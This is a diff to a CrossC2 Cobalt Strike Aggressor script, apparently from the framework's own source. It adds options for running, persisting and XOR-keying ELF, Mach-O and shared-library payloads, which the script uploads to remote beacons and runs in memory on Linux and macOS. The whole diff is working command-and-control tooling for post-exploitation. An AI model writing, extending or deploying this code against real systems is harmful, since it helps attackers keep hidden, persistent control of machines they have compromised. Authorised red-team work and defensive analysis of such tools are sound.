@@ -11,26 +11,46 @@ sub random_string {
 }
 
 sub runType {
-    $type = $1;
-    if ($type eq "ELF" || $type eq "MachO") {
+    $type = lc($1);
+    if ($type eq "elf" || $type eq "macho" || $type eq "elf/macho") {
         return "0";
-    } else if ($type eq "so" || $type eq "dylib") {
+    } else if ($type eq "so" || $type eq "dylib" || $type eq "so/dylib") {
         return "1";
     }
     return -1;
 }
 
 
+
 sub genTaskinfo_dyn {
     $taskType = $1;
-    $taskName = $2;
+    $taskAliasName = $2;
     $taskResType = $3;
-    $juicySize = $4;
-    $transportArg = $5;
+    $taskNeedRun = lc($4);
+    if ($taskNeedRun eq "y" || $taskNeedRun eq "yes") {
+        $taskNeedRun = "Y";
+    } else {
+        $taskNeedRun = "N";
+    }
+    $taskNeedPersistence = lc($5);
+    if ($taskNeedPersistence eq "y" || $taskNeedPersistence eq "yes") {
+        $taskAliasName = $taskAliasName . "\$\$";
+    }
+    $taskXorKey = $6;
+    $juicySize = $7;
+    $transportArg = $8;
+
+    $taskName = random_string(8);
+
+    if ($taskResType eq "no-info") {
+        $taskResType = "98765";
+    }
+
     
-    $taskinfo = "CrossC2^" . $taskType . "^". $taskName . "^" . $taskResType . "^" . $juicySize . "^" . $transportArg;
+    $taskinfo = "CrossC2@^" . $taskType . "^" . $taskNeedRun . "^". $taskName . "^". $taskAliasName . "^" . $taskResType . "^" . $juicySize . "^" . $transportArg;
     return $taskinfo;
 }
+
 
 sub genMemScriptInfo {
     $scriptType = $1;
@@ -58,11 +78,16 @@ sub transportArgs {
     $arg = "";
     foreach $index => $value ($2) {
         if ($index > $afterIndex) {
-            $arg = $arg . "^" .$value;
+            if ($arg eq "") {
+                $arg = $value;
+            } else {
+                $arg = $arg . "^" .$value;
+            }
         }
     }
     return base64_encode($arg);
 }
+
 
 sub transportStrings {
     $afterIndex = int($1) - 1;
@@ -81,25 +106,63 @@ sub transportStrings {
     return $arg;
 }
 
-sub bcrossc2_load_dyn {
+sub bcrossc2_load_dyn_pro {
     $beaconid = $1;
     $taskType = $2;
     $taskName = $3;
-    $taskName = $taskName . random_string(4);
     $taskResType = $4;
-    $loadFileName = $5;
-    $taskArgs = base64_encode($6);
+    $taskNeedRun = $5;
+    $taskNeedPersistence = $6;
+    $taskXorKey = $7;
+    $loadFileName = $8;
+    $taskArgs = $9;
 
-    $handle = openf(script_resource($loadFileName));
+    $loadFilePath = script_resource($loadFileName);
+    $juicySize = lof(script_resource($loadFileName));
+    if ($juicySize <= 0) {
+        $loadFilePath = $loadFileName;
+    }
+
+    $handle = openf($loadFilePath);
     $juicyData = readb($handle, -1);
     closef($handle);
 
-    $juicySize = lof(script_resource($loadFileName));
+    $juicySize = lof($loadFilePath);
     $taskType = runType($taskType);
     if ($taskType == -1) {
         berror($beaconid, "[ CrossC2 ]: dynamic lib or executable filetype not found");
     }
-    $ELFName = genTaskinfo_dyn($taskType, $taskName, $taskResType, $juicySize, $taskArgs);
+    $ELFName = genTaskinfo_dyn($taskType, $taskName, $taskResType, $taskNeedRun, $taskNeedPersistence, $taskXorKey, $juicySize, $taskArgs);
+    bupload_raw($beaconid,$ELFName,$juicyData);
+}
+
+sub bcrossc2_load_dyn {
+    $beaconid = $1;
+    $taskType = $2;
+    $taskName = $3;
+    $taskResType = $4;
+    $taskNeedRun = "Y";
+    $taskNeedPersistence = "N";
+    $taskXorKey = "2";
+    $loadFileName = $5;
+    $taskArgs = base64_encode($6);
+
+    $loadFilePath = script_resource($loadFileName);
+    $juicySize = lof(script_resource($loadFileName));
+    if ($juicySize <= 0) {
+        $loadFilePath = $loadFileName;
+    }
+
+    $handle = openf($loadFilePath);
+    $juicyData = readb($handle, -1);
+    closef($handle);
+
+    $juicySize = lof($loadFilePath);
+    $taskType = runType($taskType);
+    if ($taskType == -1) {
+        berror($beaconid, "[ CrossC2 ]: dynamic lib or executable filetype not found");
+    }
+    $ELFName = genTaskinfo_dyn($taskType, $taskName, $taskResType, $taskNeedRun, $taskNeedPersistence, $taskXorKey, $juicySize, $taskArgs);
     bupload_raw($beaconid,$ELFName,$juicyData);
 }
 
@@ -110,6 +173,12 @@ sub brun_script_in_mem {
     $taskResType = $4;
     $loadFileName = $5;
     $taskArgs = base64_encode($6);
+
+    $loadFilePath = script_resource($loadFileName);
+    $juicySize = lof(script_resource($loadFileName));
+    if ($juicySize <= 0) {
+        $loadFilePath = $loadFileName;
+    }
 
     $handle = openf($loadFileName);
     $juicyData = readb($handle, -1);
